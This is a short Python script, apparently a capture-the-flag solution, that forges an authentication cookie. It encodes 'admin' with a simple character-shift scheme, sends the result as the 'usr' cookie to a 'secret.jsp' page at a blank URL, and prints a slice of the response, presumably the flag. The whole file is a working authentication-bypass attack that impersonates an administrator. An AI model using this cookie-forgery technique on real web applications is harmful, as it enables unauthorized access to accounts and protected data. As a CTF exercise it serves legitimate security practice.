import requests

def encrypt(s):
    res = ""
    for i in s:
        if ord(i)%2 == 0:
            res += chr(ord(i) + 2)
        else:
            res += chr(ord(i) - 2)
        res += "a"
    return res

def main():
    url = "" + "secret.jsp"
    cookies = {"usr" : encrypt("admin")}
    res = requests.get(url, cookies=cookies)
    print(res.text[15:43])

if __name__ == "__main__":
    main()